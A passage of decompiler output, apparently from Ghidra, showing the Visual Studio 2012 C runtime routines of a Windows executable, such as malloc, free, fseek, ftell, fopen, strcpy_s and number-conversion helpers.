        auVar11[4] = -(pcVar8[0x14] == '\0');
        auVar11[5] = -(pcVar8[0x15] == '\0');
        auVar11[6] = -(pcVar8[0x16] == '\0');
        auVar11[7] = -(pcVar8[0x17] == '\0');
        auVar11[8] = -(pcVar8[0x18] == '\0');
        auVar11[9] = -(pcVar8[0x19] == '\0');
        auVar11[10] = -(pcVar8[0x1a] == '\0');
        auVar11[11] = -(pcVar8[0x1b] == '\0');
        auVar11[12] = -(pcVar8[0x1c] == '\0');
        auVar11[13] = -(pcVar8[0x1d] == '\0');
        auVar11[14] = -(pcVar8[0x1e] == '\0');
        auVar11[15] = -(pcVar8[0x1f] == '\0');
        pcVar8 = pcVar8 + 0x10;
        uVar3 = (uint)(ushort)((ushort)(SUB161(auVar11 >> 7,0) & 1) |
                               (ushort)(SUB161(auVar11 >> 0xf,0) & 1) << 1 |
                               (ushort)(SUB161(auVar11 >> 0x17,0) & 1) << 2 |
                               (ushort)(SUB161(auVar11 >> 0x1f,0) & 1) << 3 |
                               (ushort)(SUB161(auVar11 >> 0x27,0) & 1) << 4 |
                               (ushort)(SUB161(auVar11 >> 0x2f,0) & 1) << 5 |
                               (ushort)(SUB161(auVar11 >> 0x37,0) & 1) << 6 |
                               (ushort)(SUB161(auVar11 >> 0x3f,0) & 1) << 7 |
                               (ushort)(SUB161(auVar11 >> 0x47,0) & 1) << 8 |
                               (ushort)(SUB161(auVar11 >> 0x4f,0) & 1) << 9 |
                               (ushort)(SUB161(auVar11 >> 0x57,0) & 1) << 10 |
                               (ushort)(SUB161(auVar11 >> 0x5f,0) & 1) << 0xb |
                               (ushort)(SUB161(auVar11 >> 0x67,0) & 1) << 0xc |
                               (ushort)(SUB161(auVar11 >> 0x6f,0) & 1) << 0xd |
                               (ushort)(SUB161(auVar11 >> 0x77,0) & 1) << 0xe |
                              (ushort)(auVar11[15] >> 7) << 0xf);
      }
      iVar6 = 0;
      if (uVar3 != 0) {
        for (; (uVar3 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {
        }
      }
      pauVar7 = (undefined (*) [16])(pcVar8 + iVar6);
    }
    else {
      pauVar7 = (undefined (*) [16])0x0;
      uVar5 = (uint)param_1 & 0xf;
      while (uVar5 != 0) {
        if ((byte)(*param_1)[0] == uVar3) {
          pauVar7 = param_1;
        }
        if ((byte)(*param_1)[0] == 0) {
          return pauVar7;
        }
        param_1 = (undefined (*) [16])(*param_1 + 1);
        uVar5 = (uint)param_1 & 0xf;
      }
      do {
        pauVar4 = param_1 + 1;
        iVar6 = pcmpistri(ZEXT416(uVar3),*param_1,0x40);
        if ((undefined (*) [16])0xffffffef < param_1) {
          pauVar7 = (undefined (*) [16])(*param_1 + iVar6);
        }
        param_1 = pauVar4;
      } while (pauVar4 != (undefined (*) [16])0x0);
    }
    return pauVar7;
  }
  iVar6 = -1;
  do {
    pauVar7 = param_1;
    if (iVar6 == 0) break;
    iVar6 = iVar6 + -1;
    pauVar7 = (undefined (*) [16])(*param_1 + 1);
    puVar2 = *param_1;
    param_1 = pauVar7;
  } while (*puVar2 != '\0');
  iVar6 = -(iVar6 + 1);
  pbVar10 = pauVar7[-1] + 0xf;
  do {
    pbVar9 = pbVar10;
    if (iVar6 == 0) break;
    iVar6 = iVar6 + -1;
    pbVar9 = pbVar10 + -1;
    bVar1 = *pbVar10;
    pbVar10 = pbVar9;
  } while (param_2 != bVar1);
  pauVar7 = (undefined (*) [16])(pbVar9 + 1);
  if ((*pauVar7)[0] != param_2) {
    pauVar7 = (undefined (*) [16])0x0;
  }
  return pauVar7;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2012 Release

void * __cdecl _malloc(size_t _Size)

{
  LPVOID pvVar1;
  int iVar2;
  int *piVar3;
  SIZE_T dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_0041b8b8 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(DAT_0041b8b8,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_0041bbdc == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Multiple Matches With Different Base Names
//  __free_base
//  _free
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_0041b8b8,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2012 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  long lVar3;
  uint uVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    iVar2 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar3 = __ftell_nolock(_File);
      _Offset = _Offset + lVar3;
      _Origin = 0;
    }
    __flush(_File);
    uVar4 = _File->_flag;
    if ((char)uVar4 < '\0') {
      _File->_flag = uVar4 & 0xfffffffc;
    }
    else if ((((uVar4 & 1) != 0) && ((uVar4 & 8) != 0)) && ((uVar4 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    uVar4 = __fileno(_File);
    lVar3 = FUN_0040c531(uVar4,_Offset,_Origin);
    iVar2 = (lVar3 != -1) - 1;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2012 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_00406bf7();
  }
  return iVar2;
}



void FUN_00406bf7(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2012 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  BOOL BVar5;
  char *pcVar6;
  char *pcVar7;
  long lVar8;
  byte *pbVar9;
  byte *pbVar10;
  char *pcVar11;
  longlong lVar12;
  char *local_1018;
  int local_1014;
  char local_100d;
  undefined4 local_100c;
  byte local_1008 [4096];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_00407ceb();
  }
  else {
    uVar3 = __fileno(_File);
    if (_File->_cnt < 0) {
      _File->_cnt = 0;
    }
    local_100c = FUN_0040c531(uVar3,0,1);
    if (-1 < local_100c) {
      local_1014 = (int)uVar3 >> 5;
      iVar4 = (uVar3 & 0x1f) * 0x40;
      local_100d = (char)(*(char *)(iVar4 + 0x24 + (&DAT_0041b8c0)[local_1014]) * '\x02') >> 1;
      if ((_File->_flag & 0x108U) != 0) {
        pcVar11 = _File->_ptr;
        local_1018 = pcVar11 + -(int)_File->_base;
        if ((*(byte *)&_File->_flag & 3) == 0) {
          if ((*(byte *)&_File->_flag & 0x80) == 0) {
            piVar2 = __errno();
            *piVar2 = 0x16;
            goto LAB_00406f4b;
          }
        }
        else {
          if ((local_100d == '\x01') && (*(int *)(iVar4 + 0x30 + (&DAT_0041b8c0)[local_1014]) != 0))
          {
            pcVar11 = (char *)((uint)local_1018 >> 1);
            if (_File->_cnt != 0) {
              lVar12 = FUN_0040c685(uVar3,*(undefined4 *)
                                           (iVar4 + 0x28 + (&DAT_0041b8c0)[local_1014]),
                                    *(undefined4 *)(iVar4 + 0x2c + (&DAT_0041b8c0)[local_1014]),0);
              iVar1 = (&DAT_0041b8c0)[local_1014];
              if (((((int)lVar12 == *(int *)(iVar4 + 0x28 + iVar1)) &&
                   ((int)((ulonglong)lVar12 >> 0x20) == *(int *)(iVar4 + 0x2c + iVar1))) &&
                  (BVar5 = ReadFile(*(HANDLE *)(iVar4 + iVar1),local_1008,0x1000,
                                    (LPDWORD)&local_1018,(LPOVERLAPPED)0x0), BVar5 != 0)) &&
                 (((lVar8 = FUN_0040c531(uVar3,local_100c,0), -1 < lVar8 && (pcVar11 <= local_1018))
                  && (pbVar9 = local_1008, pcVar11 != (char *)0x0)))) {
                pbVar10 = pbVar9 + (int)local_1018;
                do {
                  pcVar11 = pcVar11 + -1;
                  if (pbVar10 <= pbVar9) break;
                  if (*pbVar9 == 0xd) {
                    if ((pbVar9 < local_1018 + (int)&local_100c + 3) && (pbVar9[1] == 10)) {
                      pbVar9 = pbVar9 + 1;
                    }
                  }
                  else {
                    pbVar9 = pbVar9 + (char)(&DAT_0041a440)[*pbVar9];
                  }
                  pbVar9 = pbVar9 + 1;
                } while (pcVar11 != (char *)0x0);
              }
            }
            goto LAB_00406f4b;
          }
          if ((*(byte *)(iVar4 + 4 + (&DAT_0041b8c0)[local_1014]) & 0x80) != 0) {
            local_1018 = _File->_base;
            for (pcVar6 = local_1018; pcVar6 < pcVar11; pcVar6 = pcVar6 + 1) {
            }
          }
        }
        if ((((local_100c != 0) && ((*(byte *)&_File->_flag & 1) != 0)) && (_File->_cnt != 0)) &&
           (pcVar6 = _File->_base, iVar1 = _File->_cnt,
           (*(byte *)(iVar4 + 4 + (&DAT_0041b8c0)[local_1014]) & 0x80) != 0)) {
          lVar8 = FUN_0040c531(uVar3,0,2);
          if (lVar8 == local_100c) {
            pcVar7 = _File->_base;
            pcVar11 = pcVar7 + (int)(pcVar11 + (iVar1 - (int)pcVar6));
            for (; pcVar7 < pcVar11; pcVar7 = pcVar7 + 1) {
            }
          }
          else {
            FUN_0040c531(uVar3,local_100c,0);
          }
        }
      }
    }
  }
LAB_00406f4b:
  lVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return lVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2012 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_00406fb8();
  }
  return lVar2;
}



void FUN_00406fb8(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



uint FUN_00406fc0(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



void __cdecl FUN_00406fe3(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        cVar1 = *_Src;
        _Src[iVar3] = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      iVar3 = 0x22;
      goto LAB_00407015;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  iVar3 = 0x16;
LAB_00407015:
  *piVar2 = iVar3;
  FUN_00407ceb();
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __fsopen
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl __fsopen(char *_Filename,char *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00418e00;
  uStack_c = 0x407054;
  if (((_Filename == (char *)0x0) || (_Mode == (char *)0x0)) || (*_Mode == '\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != '\0') {
        pFVar2 = __openfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00407104();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_0041a038,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00407104(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  _fopen
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl _fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
  pFVar1 = __fsopen(_Filename,_Mode,0x40);
  return pFVar1;
}



undefined4 * __thiscall FUN_00407121(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2012 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  local_8 = s_bad_allocation_0041426c;
  std::exception::exception((exception *)local_14,&local_8,1);
  local_14[0] = std::bad_alloc::vftable;
  __CxxThrowException_8((int *)local_14,&DAT_00418e1c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



undefined4 * __thiscall FUN_00407196(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  FUN_0040cae1((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2012 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint uVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_0041ac3c) && ((p_Var2->_ownlocale & DAT_0041ad04) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_0041a5a8) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_0041ad04) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    uVar1 = *(uint *)(*(int *)(this + 8) + 0x70);
    if ((uVar1 & 2) == 0) {
      *(uint *)(*(int *)(this + 8) + 0x70) = uVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2012 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t wVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined4 uVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  uint extraout_ECX;
  wchar_t *pwVar8;
  uint uVar9;
  bool bVar10;
  undefined8 uVar11;
  longlong lVar12;
  ushort uVar13;
  _LocaleUpdate local_38 [8];
  int local_30;
  char local_2c;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_38,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    FUN_00407ceb();
  }
  else {
    wVar1 = *param_2;
    local_8 = 0;
    local_18 = 0;
    pwVar8 = param_2 + 1;
    local_10 = (uint)(ushort)wVar1;
    iVar6 = _iswctype(wVar1,8);
    uVar9 = (uint)(ushort)wVar1;
    uVar4 = 0;
    while (iVar6 != 0) {
      wVar1 = *pwVar8;
      local_10 = (uint)(ushort)wVar1;
      pwVar8 = pwVar8 + 1;
      iVar6 = _iswctype(wVar1,8);
      uVar9 = local_10;
      uVar4 = local_18;
    }
    if ((short)uVar9 == 0x2d) {
      param_5 = param_5 | 2;
LAB_004072df:
      uVar9 = (uint)(ushort)*pwVar8;
      pwVar8 = pwVar8 + 1;
      local_10 = uVar9;
    }
    else if ((short)uVar9 == 0x2b) goto LAB_004072df;
    if (((-1 < param_4) && (param_4 != 1)) && (param_4 < 0x25)) {
      local_c = param_5;
      if (param_4 == 0) {
        iVar6 = __wchartodigit((ushort)uVar9);
        if (iVar6 != 0) {
          param_4 = 10;
          goto LAB_0040736c;
        }
        if ((*pwVar8 != L'x') && (*pwVar8 != L'X')) {
          param_4 = 8;
          goto LAB_0040736c;
        }
        param_4 = 0x10;
      }
      if (((param_4 == 0x10) && (iVar6 = __wchartodigit((ushort)uVar9), iVar6 == 0)) &&
         ((*pwVar8 == L'x' || (*pwVar8 == L'X')))) {
        uVar9 = (uint)(ushort)pwVar8[1];
        pwVar8 = pwVar8 + 2;
        local_10 = uVar9;
      }
LAB_0040736c:
      local_24 = param_4 >> 0x1f;
      local_28 = param_4;
      uVar11 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_24);
      uVar7 = local_10;
      local_20 = extraout_ECX;
      local_1c = uVar9;
      uVar3 = CONCAT44(uVar4,local_8);
      do {
        uVar9 = (uint)(uVar3 >> 0x20);
        local_8 = (uint)uVar3;
        local_18 = (uint)((ulonglong)uVar11 >> 0x20);
        local_14 = (uint)uVar11;
        uVar13 = (ushort)uVar7;
        local_10 = __wchartodigit(uVar13);
        uVar2 = CONCAT44(uVar9,local_8);
        if (local_10 == 0xffffffff) {
          if (((uVar13 < 0x41) || (0x5a < uVar13)) && (0x19 < (ushort)(uVar13 - 0x61)))
          goto LAB_004073c2;
          uVar7 = uVar7 & 0xffff;
          if ((ushort)(uVar13 - 0x61) < 0x1a) {
            uVar7 = uVar7 - 0x20;
          }
          local_10 = uVar7 - 0x37;
        }
        if ((uint)param_4 <= local_10) goto LAB_004073c2;
        if (((uVar9 < local_18) || ((uVar9 <= local_18 && (local_8 < local_14)))) ||
           ((local_8 == local_14 &&
            ((uVar9 == local_18 && ((local_1c != 0 || (local_10 <= local_20)))))))) {
          local_c = local_c | 8;
          lVar12 = __allmul(local_28,local_24,local_8,uVar9);
          uVar2 = lVar12 + (ulonglong)local_10;
        }
        else {
          local_c = local_c | 0xc;
          if (param_3 == (wchar_t **)0x0) goto LAB_004073c2;
        }
        uVar11 = CONCAT44(local_18,local_14);
        uVar7 = (uint)(ushort)*pwVar8;
        pwVar8 = pwVar8 + 1;
        uVar3 = uVar2;
      } while( true );
    }
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
  }
  local_8 = 0;
  uVar9 = 0;
LAB_004074fd:
  if (local_2c != '\0') {
    *(uint *)(local_30 + 0x70) = *(uint *)(local_30 + 0x70) & 0xfffffffd;
  }
  return CONCAT44(uVar9,local_8);
LAB_004073c2:
  uVar7 = local_c;
  pwVar8 = pwVar8 + -1;
  if ((local_c & 8) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar8 = param_2;
    }
    local_8 = 0;
    uVar9 = 0;
  }
  else if (((local_c & 4) != 0) ||
          (((local_c & 1) == 0 &&
           ((((local_c & 2) != 0 &&
             ((0x80000000ffffffff < uVar3 || ((0x7fffffffffffffff < uVar3 && (local_8 != 0)))))) ||
            (((local_c & 2) == 0 && ((0x7ffffffeffffffff < uVar3 && (0x7fffffffffffffff < uVar3)))))
            ))))) {
    piVar5 = __errno();
    *piVar5 = 0x22;
    if ((uVar7 & 1) == 0) {
      if ((uVar7 & 2) == 0) {
        local_8 = 0xffffffff;
        uVar9 = 0x7fffffff;
      }
      else {
        local_8 = 0;
        uVar9 = 0x80000000;
      }
    }
    else {
      local_8 = 0xffffffff;
      uVar9 = 0xffffffff;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar8;
  }
  if ((uVar7 & 2) != 0) {
    bVar10 = local_8 != 0;
    local_8 = -local_8;
    uVar9 = -(uVar9 + bVar10);
  }
  goto LAB_004074fd;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2012 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_0041bbfc == 0) {
    ppuVar2 = &PTR_DAT_0041acf8;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_0041b8b8,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Libraries: Visual Studio 2012, Visual Studio 2015, Visual Studio 2017, Visual Studio 2019

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
    eVar1 = 0;
  }
  else if (_Dst == (void *)0x0) {
    piVar2 = __errno();
    eVar1 = 0x16;
    *piVar2 = 0x16;
    FUN_00407ceb();
  }
  else if ((_Src == (void *)0x0) || (_DstSize < _MaxCount)) {
    FUN_00409600((uint *)_Dst,0,_DstSize);
    if (_Src == (void *)0x0) {
      piVar2 = __errno();
      eVar1 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
    }
    *piVar2 = eVar1;
    FUN_00407ceb();
  }
  else {
    FID_conflict__memcpy(_Dst,_Src,_MaxCount);
    eVar1 = 0;
  }
  return eVar1;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  uint uVar2;
  
  if ((_Radix == 10) && (_Val < 0)) {
    uVar2 = 1;
    _Radix = 10;
  }
  else {
    uVar2 = 0;
  }
  iVar1 = _xtow_s_20(_Val,_DstBuf,_SizeInWords,_Radix,uVar2);
  return iVar1;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2012 Release

int _xtow_s_20(uint param_1,short *param_2,uint param_3,uint param_4,uint param_5)

{
  short *psVar1;
  short sVar2;
  int *piVar3;
  short *psVar4;
  short *psVar5;
  int iStack_14;
  
  if (param_2 == (short *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_00407ceb();
    return 0x16;
  }
  if (param_3 != 0) {
    *param_2 = 0;
    if (param_3 <= (param_5 != 0) + 1) {
      piVar3 = __errno();
      iStack_14 = 0x22;
      goto LAB_004076a9;
    }
    iStack_14 = 0x22;
    if (param_4 - 2 < 0x23) {
      psVar4 = param_2;
      if (param_5 != 0) {
        *param_2 = 0x2d;
        psVar4 = param_2 + 1;
        param_1 = -param_1;
      }
      param_5 = (uint)(param_5 != 0);
      psVar1 = psVar4;
      do {
        psVar5 = psVar1;
        sVar2 = (short)(param_1 % param_4);
        if (param_1 % param_4 < 10) {
          sVar2 = sVar2 + 0x30;
        }
        else {
          sVar2 = sVar2 + 0x57;
        }
        *psVar5 = sVar2;
        param_5 = param_5 + 1;
      } while ((param_1 / param_4 != 0) &&
              (param_1 = param_1 / param_4, psVar1 = psVar5 + 1, param_5 < param_3));
      if (param_5 < param_3) {
        psVar5[1] = 0;
        do {
          sVar2 = *psVar5;
          *psVar5 = *psVar4;
          *psVar4 = sVar2;
          psVar5 = psVar5 + -1;
          psVar4 = psVar4 + 1;
        } while (psVar4 < psVar5);
        return 0;
      }
      *param_2 = 0;
      piVar3 = __errno();
      goto LAB_004076a9;
    }
  }
  piVar3 = __errno();
  iStack_14 = 0x16;
LAB_004076a9:
  *piVar3 = iStack_14;
  FUN_00407ceb();
  return iStack_14;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2012 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    iVar3 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar3) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar3;
        }
        uVar2 = FUN_00407dae(0,&local_24);
        if (uVar2 != 0xffffffff) {
          return iVar3;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar3 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2012 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vsnprintf_helper(FUN_0040d9a7,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = '\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_00407ceb();
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2012 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00407833(void)

